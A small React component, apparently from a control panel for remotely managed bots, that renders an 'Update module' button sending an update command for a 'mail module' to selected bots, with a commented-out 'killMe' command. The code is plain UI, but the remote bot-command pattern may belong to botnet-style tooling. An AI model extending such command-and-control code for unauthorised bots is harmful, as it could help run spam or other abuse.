import React from 'react';
import SettingsContext from '../../Settings';


//{"name":"killMe"}
class UpdateModule extends React.Component {

    constructor(props) {
        super(props);
    }

    onClickUpdateModule = (e) => {
        if(SettingsContext.BotsSelected()) {
            SettingsContext.BotSendCommand('{"name":"updateModule"}');
            SettingsContext.ShowToast("success", "Send message to update module");
        }
    }

    render () {
        return (
            <React.Fragment>
                <div class="card">
                <div class="card-body">
                    <h5 class="card-title">Update Module</h5>
                    <h6 class="card-subtitle mb-2 text-muted">Update mail module (and sub modules) on selected bots</h6>
                    <button type="button" onClick={this.onClickUpdateModule} class="btn btn-right btn-outline-warning">Update module</button>
                </div>
                </div>
            </React.Fragment>
        );
    }
}

export default UpdateModule;